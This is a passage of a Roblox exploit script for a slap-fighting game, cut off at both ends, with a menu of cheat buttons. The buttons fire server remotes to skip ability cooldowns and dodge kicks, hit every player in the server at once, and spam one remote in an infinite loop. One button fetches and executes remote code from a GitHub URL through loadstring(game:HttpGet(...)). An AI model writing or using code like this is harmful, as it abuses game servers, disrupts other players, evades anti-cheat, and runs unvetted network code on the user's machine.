    Name = "BOOBLE",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "Bubble" then
            local player = game.Players.LocalPlayer
            local gui = player:WaitForChild("PlayerGui")

            -- Create the ScreenGui
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "BoobleButton"
            screenGui.ResetOnSpawn = true
            screenGui.Parent = gui

            -- Create the Button
            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0, 100, 0, 100)
            button.Position = UDim2.new(0, 700, 0, 100)
            button.Text = "E"
            button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 60
            button.Parent = screenGui

            -- Cooldown logic
            local cooldown = false
            local cooldownTime = 1
            local updateRate = 0.05

            button.MouseButton1Click:Connect(function()
                if cooldown then return end
                game:GetService("ReplicatedStorage").BubbleThrow:FireServer()
                cooldown = true
                local timeLeft = cooldownTime
                while timeLeft > 0 do
                    button.Text = string.format("%.2f", timeLeft)
                    wait(updateRate)
                    timeLeft -= updateRate
                end
                button.Text = "E"
                cooldown = false
            end)

            -- UI Stroke (black outline)
            local stroke = Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(0, 0, 0)
            stroke.Thickness = 3
            stroke.Transparency = 0
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            stroke.Parent = button

            -- UICorner (rounded edges)
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 9)
            corner.Parent = button
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Bubble Glove To Work",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

Tab:AddParagraph("How It Works?", "Uses Bubble Glove But Without Cooldown And It Creates E Button Where U Can Click To Use BOOBLE And There Will Be Cd Protection So U Wont Get Kicked")

-- Section: BoggieWoogie
Section = Tab:AddSection({ Name = "BoggieWoogie" })

Tab:AddButton({
    Name = "BoggieWoogie",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "Swapper" then
            local player = game.Players.LocalPlayer
            local gui = player:WaitForChild("PlayerGui")

            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "BoogieWoogieButton"
            screenGui.ResetOnSpawn = true
            screenGui.Parent = gui

            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0, 100, 0, 100)
            button.Position = UDim2.new(0, 700, 0, 100)
            button.Text = "E"
            button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 60
            button.Parent = screenGui

            local cooldown = false
            local cooldownTime = 1
            local updateRate = 0.05

            button.MouseButton1Click:Connect(function()
                if cooldown then return end
                game:GetService("ReplicatedStorage").SLOC:FireServer()
                cooldown = true
                local timeLeft = cooldownTime
                while timeLeft > 0 do
                    button.Text = string.format("%.2f", timeLeft)
                    wait(updateRate)
                    timeLeft -= updateRate
                end
                button.Text = "E"
                cooldown = false
            end)

            local stroke = Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(0, 0, 0)
            stroke.Thickness = 3
            stroke.Transparency = 0
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            stroke.Parent = button

            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 9)
            corner.Parent = button
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Swapper Glove To Work",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

Tab:AddParagraph("How It Works?", "Uses Swapper Glove But Without Cooldown And It Creates E Button Where U Can Click To Use BoggieWoogie And There Will Be Cd Protection So U Wont Get Kicked")

-- Section: Clone()
Section = Tab:AddSection({ Name = "Clone()" })

Tab:AddButton({
    Name = "Clone()",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "Replica" then
            local player = game.Players.LocalPlayer
            local gui = player:WaitForChild("PlayerGui")

            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "CloneButton"
            screenGui.ResetOnSpawn = true
            screenGui.Parent = gui

            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0, 100, 0, 100)
            button.Position = UDim2.new(0, 700, 0, 100)
            button.Text = "E"
            button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 60
            button.Parent = screenGui

            local cooldown = false
            local cooldownTime = 1
            local updateRate = 0.05

            button.MouseButton1Click:Connect(function()
                if cooldown then return end
                game:GetService("ReplicatedStorage").Duplicate:FireServer()
                cooldown = true
                local timeLeft = cooldownTime
                while timeLeft > 0 do
                    button.Text = string.format("%.2f", timeLeft)
                    wait(updateRate)
                    timeLeft -= updateRate
                end
                button.Text = "E"
                cooldown = false
            end)

            local stroke = Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(0, 0, 0)
            stroke.Thickness = 3
            stroke.Transparency = 0
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            stroke.Parent = button

            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 9)
            corner.Parent = button
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Replica Glove To Work",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

Tab:AddParagraph("How It Works?", "Uses Replica Glove But Without Cooldown And It Creates E Button Where U Can Click To Use Clone() And There Will Be Cd Protection So U Wont Get Kicked")

Section = Tab:AddSection({
    Name = "Edgelord"
})

Tab:AddButton({
    Name = "Edgelord",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "Dual" then
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local humanoid = character:WaitForChild("Humanoid")

            -- Animation instances
            local idleAnim = Instance.new("Animation")
            idleAnim.AnimationId = "rbxassetid://16163355836"  -- Idle animation

            local walkAnim = Instance.new("Animation")
            walkAnim.AnimationId = "rbxassetid://16163350920"  -- Walking animation

            -- Load animations
            local idleTrack = humanoid:LoadAnimation(idleAnim)
            local walkTrack = humanoid:LoadAnimation(walkAnim)

            -- Function to update the animation based on walking or standing
            local function updateAnimation()
                if humanoid.WalkSpeed > 0 then
                    -- If the player is walking, play walking animation
                    if not walkTrack.IsPlaying then
                        walkTrack:Play()
                        idleTrack:Stop()  -- Stop idle animation if walking
                    end
                else
                    -- If the player is standing still, play idle animation
                    if not idleTrack.IsPlaying then
                        idleTrack:Play()
                        walkTrack:Stop()  -- Stop walking animation if standing still
                    end
                end
            end

            -- Continuously update the animation based on the player's state
            game:GetService("RunService").Heartbeat:Connect(function()
                updateAnimation()
            end)

            ----------------------------------------------------------------------------------------------------------------
            -- E BUTTON
            local gui = player:WaitForChild("PlayerGui")

            -- Create the ScreenGui
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "EdgelordEButton"
            screenGui.ResetOnSpawn = true
            screenGui.Parent = gui

            -- Create the Button
            local buttonE = Instance.new("TextButton")
            buttonE.Size = UDim2.new(0.1, 0, 0.1, 0)
            buttonE.Position = UDim2.new(0.05, 0, 0.8, 0)
            buttonE.Text = "E"
            buttonE.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            buttonE.TextColor3 = Color3.fromRGB(255, 255, 255)
            buttonE.Font = Enum.Font.SourceSansBold
            buttonE.TextSize = 60
            buttonE.Parent = screenGui

            -- Cooldown logic
            local cooldown = false
            local cooldownTime = 0 -- seconds
            local updateRate = 0 -- how often to update display (smaller = smoother)

            buttonE.MouseButton1Click:Connect(function()
                if cooldown then return end

                -- Play Edgelord slap animation
                local animationId = "rbxassetid://17670135152"  -- The animation ID you provided

                local function playAnimation()
                    local character = player.Character or player.CharacterAdded:Wait()
                    local humanoid = character:WaitForChild("Humanoid")

                    -- Create the animation instance
                    local animation = Instance.new("Animation")
                    animation.AnimationId = animationId  -- Set the animation ID

                    -- Load the animation onto the humanoid
                    local animationTrack = humanoid:LoadAnimation(animation)

                    -- Play the animation
                    animationTrack:Play()
                end

                task.wait()  -- Optional wait to ensure character is fully loaded
                playAnimation()

                local Players = game:GetService("Players")
                local ReplicatedStorage = game:GetService("ReplicatedStorage")

                for _, player in pairs(Players:GetPlayers()) do
                    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        local args = { [1] = player.Character.HumanoidRootPart }
                        ReplicatedStorage:WaitForChild("GeneralHit"):FireServer(unpack(args))
                    end
                end

                -- Start Cooldown
                cooldown = true
                local timeLeft = cooldownTime

                while timeLeft > 0 do
                    buttonE.Text = string.format("%.2f", timeLeft)
                    wait(updateRate)
                    timeLeft -= updateRate
                end

                -- Reset
                buttonE.Text = "E"
                cooldown = false
            end)

            -- Create UIStroke (black outline)
            local strokeE = Instance.new("UIStroke")
            strokeE.Color = Color3.fromRGB(0, 0, 0)
            strokeE.Thickness = 3
            strokeE.Transparency = 0
            strokeE.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            strokeE.Parent = buttonE

            -- UICorner (rounded edges with clean radius)
            local cornerE = Instance.new("UICorner")
            cornerE.CornerRadius = UDim.new(0, 9) -- 👈 Clean: scale 0, offset 9
            cornerE.Parent = buttonE

            ----------------------------------------------------------------------------------------------------------------
            -- R BUTTON
            -- Create the ScreenGui
            local screenGuiR = Instance.new("ScreenGui")
            screenGuiR.Name = "EdgelordRButton"
            screenGuiR.ResetOnSpawn = true
            screenGuiR.Parent = gui

            -- Create the Button
            local buttonR = Instance.new("TextButton")
            buttonR.Size = UDim2.new(0.1, 0, 0.1, 0)
            buttonR.Position = UDim2.new(0.3, 0, 0.8, 0)
            buttonR.Text = "R"
            buttonR.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            buttonR.TextColor3 = Color3.fromRGB(255, 255, 255)
            buttonR.Font = Enum.Font.SourceSansBold
            buttonR.TextSize = 60
            buttonR.Parent = screenGuiR

            -- Cooldown logic
            local cooldownR = false
            local cooldownTimeR = 0 -- seconds
            local updateRateR = 0 -- how often to update display (smaller = smoother)

            buttonR.MouseButton1Click:Connect(function()
                if cooldownR then return end

                -- Reset the player's character
                game.Players.LocalPlayer.Character.Humanoid.Health = 0

                -- Start Cooldown
                cooldownR = true
                local timeLeft = cooldownTimeR

                while timeLeft > 0 do
                    buttonR.Text = string.format("%.2f", timeLeft)
                    wait(updateRateR)
                    timeLeft -= updateRateR
                end

                -- Reset
                buttonR.Text = "R"
                cooldownR = false
            end)

            -- Create UIStroke (black outline)
            local strokeR = Instance.new("UIStroke")
            strokeR.Color = Color3.fromRGB(0, 0, 0)
            strokeR.Thickness = 3
            strokeR.Transparency = 0
            strokeR.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            strokeR.Parent = buttonR

            -- UICorner (rounded edges with clean radius)
            local cornerR = Instance.new("UICorner")
            cornerR.CornerRadius = UDim.new(0, 9)
            cornerR.Parent = buttonR

            ----------------------------------------------------------------------------------------------------------------
            -- T BUTTON
            local screenGuiT = Instance.new("ScreenGui")
            screenGuiT.Name = "EdgelordTButton"
            screenGuiT.ResetOnSpawn = true
            screenGuiT.Parent = gui

            local buttonT = Instance.new("TextButton")
            buttonT.Size = UDim2.new(0.1, 0, 0.1, 0)
            buttonT.Position = UDim2.new(0.55, 0, 0.8, 0)
            buttonT.Text = "T"
            buttonT.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            buttonT.TextColor3 = Color3.fromRGB(255, 255, 255)
            buttonT.Font = Enum.Font.SourceSansBold
            buttonT.TextSize = 60
            buttonT.Parent = screenGuiT

            local cooldownT = false
            local cooldownTimeT = 0
            local updateRateT = 0

            buttonT.MouseButton1Click:Connect(function()
                if cooldownT then return end

                local Players = game:GetService("Players")
                local player = Players.LocalPlayer

                local function teleportForward()
                    local character = player.Character or player.CharacterAdded:Wait()
                    local hrp = character:WaitForChild("HumanoidRootPart")

                    -- Get the direction the player is facing
                    local lookDirection = hrp.CFrame.LookVector.Unit

                    -- Move 20 studs in that direction
                    local offset = lookDirection * 20
                    local newPosition = hrp.Position + offset

                    -- Teleport the player forward
                    hrp.CFrame = CFrame.new(newPosition, newPosition + lookDirection)
                end

                teleportForward()

                cooldownT = true
                local timeLeft = cooldownTimeT

                while timeLeft > 0 do
                    buttonT.Text = string.format("%.2f", timeLeft)
                    wait(updateRateT)
                    timeLeft -= updateRateT
                end

                buttonT.Text = "T"
                cooldownT = false
            end)

            local strokeT = Instance.new("UIStroke")
            strokeT.Color = Color3.fromRGB(0, 0, 0)
            strokeT.Thickness = 3
            strokeT.Transparency = 0
            strokeT.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            strokeT.Parent = buttonT

            local cornerT = Instance.new("UICorner")
            cornerT.CornerRadius = UDim.new(0, 9)
            cornerT.Parent = buttonT

            ----------------------------------------------------------------------------------------------------------------
            -- F BUTTON
            local screenGuiF = Instance.new("ScreenGui")
            screenGuiF.Name = "EdgelordFButton"
            screenGuiF.ResetOnSpawn = true
            screenGuiF.Parent = gui

            local buttonF = Instance.new("TextButton")
            buttonF.Size = UDim2.new(0.1, 0, 0.1, 0)
            buttonF.Position = UDim2.new(0.8, 0, 0.8, 0)
            buttonF.Text = "F"
            buttonF.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            buttonF.TextColor3 = Color3.fromRGB(255, 255, 255)
            buttonF.Font = Enum.Font.SourceSansBold
            buttonF.TextSize = 60
            buttonF.Parent = screenGuiF

            local cooldownF = false
            local cooldownTimeF = 0
            local updateRateF = 0

            buttonF.MouseButton1Click:Connect(function()
                if cooldownF then return end

                if game.Players.LocalPlayer.leaderstats.Glove.Value == "Dual" or
                   game.Players.LocalPlayer.leaderstats.Glove.Value == "Kinetic" then

                    game.ReplicatedStorage.SelfKnockback:FireServer({
                        ["Force"] = 0,
                        ["Direction"] = Vector3.new(0, 0.01, 0)
                    })
                else
                    OrionLib:MakeNotification({
                        Name = "Error",
                        Content = "Equip Kinetic",
                        Image = "rbxassetid://7743878857",
                        Time = 3
                    })
                end

                cooldownF = true
                local timeLeft = cooldownTimeF

                while timeLeft > 0 do
                    buttonF.Text = string.format("%.2f", timeLeft)
                    wait(updateRateF)
                    timeLeft -= updateRateF
                end

                buttonF.Text = "F"
                cooldownF = false
            end)

            local strokeF = Instance.new("UIStroke")
            strokeF.Color = Color3.fromRGB(0, 0, 0)
            strokeF.Thickness = 3
            strokeF.Transparency = 0
            strokeF.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            strokeF.Parent = buttonF

            local cornerF = Instance.new("UICorner")
            cornerF.CornerRadius = UDim.new(0, 9)
            cornerF.Parent = buttonF

        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Dual Glove To Work",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

Tab:AddParagraph(
    "How It Works?",
    "It Adds 4 Buttons E = Edgelord Slap (Need Dual Glove), T = Teleports 20 Studs Forward, F = Gives +1 Kinetic Aura (Need Kinetic Glove), R = Resets Player (you). That All Also Walk And Stand Animation Going To Be Changed To Edgelord And Edgelord's Slap Animation Also Going To Be Added"
)

Section = Tab:AddSection({
    Name = "Killerfish"
})

Tab:AddButton({
    Name = "Killerfish",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/KietVN02202/KietVN02202/refs/heads/main/Killerfish.txt"))()
    end
})

Tab:AddParagraph(
    "How It Works?",
    "Can Be Any Glove And E Ability Will Do Ability As Fish Glove But You Can Use With 0 Cd And Without Getting Kicked"
)

-- Minecraft Section
Section = Tab:AddSection({
    Name = "Minecraft"
})

Tab:AddButton({
    Name = "Minecraft",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "Brick" then
            local player = game.Players.LocalPlayer
            local gui = player:WaitForChild("PlayerGui")

            -- Create the ScreenGui
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "MinecraftButton"
            screenGui.ResetOnSpawn = true
            screenGui.Parent = gui

            -- Create the Button
            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0, 100, 0, 100) -- Square shape
            button.Position = UDim2.new(0, 700, 0, 100)
            button.Text = "E"
            button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 60
            button.Parent = screenGui

            -- Cooldown logic
            local cooldown = false
            local cooldownTime = 1 -- seconds
            local updateRate = 0.05 -- update display rate

            button.MouseButton1Click:Connect(function()
                if cooldown then return end

                -- Fire the remote event
                game:GetService("ReplicatedStorage").lbrick:FireServer()

                -- Start cooldown
                cooldown = true
                local timeLeft = cooldownTime

                while timeLeft > 0 do
                    button.Text = string.format("%.2f", timeLeft)
                    wait(updateRate)
                    timeLeft -= updateRate
                end

                -- Reset button text and cooldown
                button.Text = "E"
                cooldown = false
            end)

            -- Button UI Stroke (black outline)
            local stroke = Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(0, 0, 0)
            stroke.Thickness = 3
            stroke.Transparency = 0
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            stroke.Parent = button

            -- Button UICorner (rounded edges)
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 9)
            corner.Parent = button
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Brick Glove To Work",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

Tab:AddParagraph("How It Works?", "Uses Brick Glove But Without Cooldown And It Creates E Button Where U Can Click To Use Minecraft And There Will Be Cd Protection So U Wont Get Kicked")

-- Super Parry Section
Section = Tab:AddSection({
    Name = "Super Parry"
})

Tab:AddButton({
    Name = "Super Parry",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "Parry" then
            local player = game.Players.LocalPlayer
            local gui = player:WaitForChild("PlayerGui")

            -- Create the ScreenGui
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "SuperParryButton"
            screenGui.ResetOnSpawn = true
            screenGui.Parent = gui

            -- Create the Button
            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0, 100, 0, 100)
            button.Position = UDim2.new(0, 700, 0, 100)
            button.Text = "E"
            button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 60
            button.Parent = screenGui

            -- Cooldown logic
            local cooldown = false
            local cooldownTime = 1
            local updateRate = 0.05

            button.MouseButton1Click:Connect(function()
                if cooldown then return end

                -- Fire the remote event
                game:GetService("ReplicatedStorage").GeneralAbility:FireServer()

                -- Start cooldown
                cooldown = true
                local timeLeft = cooldownTime

                while timeLeft > 0 do
                    button.Text = string.format("%.2f", timeLeft)
                    wait(updateRate)
                    timeLeft -= updateRate
                end

                -- Reset button text and cooldown
                button.Text = "E"
                cooldown = false
            end)

            -- UIStroke for button
            local stroke = Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(0, 0, 0)
            stroke.Thickness = 3
            stroke.Transparency = 0
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            stroke.Parent = button

            -- UICorner for button
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 9)
            corner.Parent = button
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Parry Glove To Work",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

Tab:AddParagraph("How It Works?", "Uses Parry Glove But Without Cooldown And It Creates E Button Where U Can Click To Use Super Parry And There Will Be Cd Protection So U Wont Get Kicked")

-- Tableflip Section
Section = Tab:AddSection({
    Name = "TABLE"
})

Tab:AddButton({
    Name = "TABLE",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "Tableflip" then
            local player = game.Players.LocalPlayer
            local gui = player:WaitForChild("PlayerGui")

            -- Create the ScreenGui
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "TABLEButton"
            screenGui.ResetOnSpawn = true
            screenGui.Parent = gui

            -- Create the Button
            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0, 100, 0, 100)
            button.Position = UDim2.new(0, 700, 0, 100)
            button.Text = "E"
            button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 60
            button.Parent = screenGui

            -- Cooldown logic
            local cooldown = false
            local cooldownTime = 1
            local updateRate = 0.05

            button.MouseButton1Click:Connect(function()
                if cooldown then return end

                -- Fire the remote event
                game:GetService("ReplicatedStorage").GeneralAbility:FireServer()

                -- Start cooldown
                cooldown = true
                local timeLeft = cooldownTime

                while timeLeft > 0 do
                    button.Text = string.format("%.2f", timeLeft)
                    wait(updateRate)
                    timeLeft -= updateRate
                end

                -- Reset button text and cooldown
                button.Text = "E"
                cooldown = false
            end)

            -- UIStroke for button
            local stroke = Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(0, 0, 0)
            stroke.Thickness = 3
            stroke.Transparency = 0
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            stroke.Parent = button

            -- UICorner for button
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 9)
            corner.Parent = button
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Tableflip Glove To Work",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

Tab:AddParagraph("How It Works?", "Uses Tableflip Glove But Without Cooldown And It Creates E Button Where U Can Click To Use TABLE And There Will Be Cd Protection So U Wont Get Kicked")

-- Run Mastered (TERRY) Section
Section = Tab:AddSection({
    Name = "TERRY"
})

Tab:AddButton({
    Name = "TERRY",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "Run" then
            local player = game.Players.LocalPlayer
            local gui = player:WaitForChild("PlayerGui")

            -- Create the ScreenGui
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "TERRYButton"
            screenGui.ResetOnSpawn = true
            screenGui.Parent = gui

            -- Create the Button
            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0, 100, 0, 100)
            button.Position = UDim2.new(0, 700, 0, 100)
            button.Text = "E"
            button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 60
            button.Parent = screenGui

            -- Cooldown logic
            local cooldown = false
            local cooldownTime = 5
            local updateRate = 0.05

            button.MouseButton1Click:Connect(function()
                if cooldown then return end

                -- Fire the remote event
                game:GetService("ReplicatedStorage").RunMasteryAbility:FireServer()

                -- Start cooldown
                cooldown = true
                local timeLeft = cooldownTime

                while timeLeft > 0 do
                    button.Text = string.format("%.2f", timeLeft)
                    wait(updateRate)
                    timeLeft -= updateRate
                end

                -- Reset button text and cooldown
               
                button.Text = "E"
                cooldown = false
                end)

                        -- UIStroke for button
        local stroke = Instance.new("UIStroke")
        stroke.Color = Color3.fromRGB(0, 0, 0)
        stroke.Thickness = 3
        stroke.Transparency = 0
        stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        stroke.Parent = button

        -- UICorner for button
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 9)
        corner.Parent = button
    else
        OrionLib:MakeNotification({
            Name = "Error",
            Content = "Equip Run Mastered Glove To Work",
            Image = "rbxassetid://7743878857",
            Time = 3
        })
    end
end
})

Tab:AddParagraph("How It Works?", "Uses Run Mastered Glove But Without Cooldown And It Creates E Button Where U Can Click To Use TERRY And There Will Be Cd Protection So U Wont Get Kicked")

Section = Tab:AddSection({
    Name = "Train"
})

-- Normal Train Button
Tab:AddButton({
    Name = "Train",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "bus" then
            local player = game.Players.LocalPlayer
            local gui = player:WaitForChild("PlayerGui")

            -- Create the ScreenGui
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "TrainButton"
            screenGui.ResetOnSpawn = true
            screenGui.Parent = gui

            -- Create the Button
            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0, 100, 0, 100)
            button.Position = UDim2.new(0, 700, 0, 100)
            button.Text = "E"
            button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 60
            button.Parent = screenGui

            -- Cooldown logic
            local cooldown = false
            local cooldownTime = 1
            local updateRate = 0.05

            button.MouseButton1Click:Connect(function()
                if cooldown then return end

                -- Fire the Remote
                game:GetService("ReplicatedStorage").busmoment:FireServer()

                -- Start Cooldown
                cooldown = true
                local timeLeft = cooldownTime
                while timeLeft > 0 do
                    button.Text = string.format("%.2f", timeLeft)
                    wait(updateRate)
                    timeLeft -= updateRate
                end

                -- Reset
                button.Text = "E"
                cooldown = false
            end)

            -- UIStroke
            local stroke = Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(0, 0, 0)
            stroke.Thickness = 3
            stroke.Transparency = 0
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            stroke.Parent = button

            -- UICorner
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 9)
            corner.Parent = button
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Bus Glove To Work",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

-- Train (Kicks) Button
Tab:AddButton({
    Name = "Train (Kicks)",
    Callback = function()
        if game.Players.LocalPlayer.leaderstats.Glove.Value == "bus" then
            local player = game.Players.LocalPlayer
            local gui = player:WaitForChild("PlayerGui")

            -- Create the ScreenGui
            local screenGui = Instance.new("ScreenGui")
            screenGui.Name = "CloneButton"
            screenGui.ResetOnSpawn = true
            screenGui.Parent = gui

            -- Create the Button
            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0, 100, 0, 100)
            button.Position = UDim2.new(0, 700, 0, 100)
            button.Text = "E"
            button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.SourceSansBold
            button.TextSize = 60
            button.Parent = screenGui

            -- Cooldown logic
            local cooldown = false
            local cooldownTime = 1
            local updateRate = 0.05

            button.MouseButton1Click:Connect(function()
                if cooldown then return end

                -- Fire the Remote Repeatedly (May Kick)
                while true do
                    game:GetService("ReplicatedStorage").busmoment:FireServer()
                    task.wait()
                end

                -- Start Cooldown (will never run because of infinite loop)
                cooldown = true
                local timeLeft = cooldownTime
                while timeLeft > 0 do
                    button.Text = string.format("%.2f", timeLeft)
                    wait(updateRate)
                    timeLeft -= updateRate
                end

                -- Reset
                button.Text = "E"
                cooldown = false
            end)

            -- UIStroke
            local stroke = Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(0, 0, 0)
            stroke.Thickness = 3
            stroke.Transparency = 0
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            stroke.Parent = button

            -- UICorner
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 9)
            corner.Parent = button
        else
            OrionLib:MakeNotification({
                Name = "Error",
                Content = "Equip Bus Glove To Work",
                Image = "rbxassetid://7743878857",
                Time = 3
            })
        end
    end
})

-- Description Paragraphs
Tab:AddParagraph("How It Works?", "Uses Bus Glove But Without Cooldown And It Creates E Button Where U Can Click To Use BoggieWoogie And There Will Be Cd Protection So U Wont Get Kicked")
Tab:AddParagraph("Or", "")
Tab:AddParagraph("How It Works?", "Uses Bus Glove But With E Button And When U Click Its Gonna Spawn Like 100 Busses But U Get Kicked")

-- CREATE TAB

local Tab = Window:MakeTab({
    Name = "Create",
    Icon = "rbxassetid://7734042071",
    PremiumOnly = false
})

Section = Tab:AddSection({
    Name = "Create Anything In 1 Click!"
})

-- ✅ Create Safespot
Tab:AddButton({
    Name = "Create Safespot",
    Callback = function()
        if workspace:FindFirstChild("Safespot") == nil then
            local Safespot = Instance.new("Model", workspace)
            Safespot.Name = "Safespot"

            local base = Instance.new("Part")
            base.Name = "Base"
            base.Size = Vector3.new(500, 10, 500)
            base.Position = Vector3.new(10000, -50, 10000)
            base.Anchored = true
            base.CanCollide = true
            base.Transparency = 0.5
            base.Parent = Safespot

            local partsData = {
                {"DefendPart",  Vector3.new(500, 117, 5),   Vector3.new(10000.2, 13, 9752.45)},
                {"DefendPart1", Vector3.new(5, 117, 496),   Vector3.new(10248.2, 13, 10002.4)},
                {"DefendPart2", Vector3.new(497, 117, 6),   Vector3.new(9998.13, 13, 10247.2)},
                {"DefendPart3", Vector3.new(7, 117, 490),   Vector3.new(9752.71, 13, 9999.28)},
                {"DefendPart4", Vector3.new(491, 10, 491),  Vector3.new(10001.1, 76, 9999.66)},
            }

            for _, partInfo in pairs(partsData) do
                local part = Instance.new("Part")
                part.Name = partInfo[1]
                part.Size = partInfo[2]
                part.Position = partInfo[3]
                part.Anchored = true
                part.CanCollide = true
                part.Transparency = 0.5
                part.Parent = Safespot
            end
        end

        OrionLib:MakeNotification({
            Name = "Checker",
            Content = "Created Successfully!",
            Image = "rbxassetid://7733919427",
            Time = 3
        })
    end
})

-- ✅ Create Tournament Safespot
Tab:AddButton({
    Name = "Create Tournament Safespot (For Slaps/Null Shards/Moon Glove)",
    Callback = function()
        if workspace:FindFirstChild("SafespotTournament") == nil then
            local Safespot = Instance.new("Part", workspace)
            Safespot.Name = "SafespotTournament"
            Safespot.Position = Vector3.new(3453, 246, -20)
            Safespot.Size = Vector3.new(1000, 1, 1000)
            Safespot.Anchored = true
            Safespot.CanCollide = true
            Safespot.Transparency = 0.5
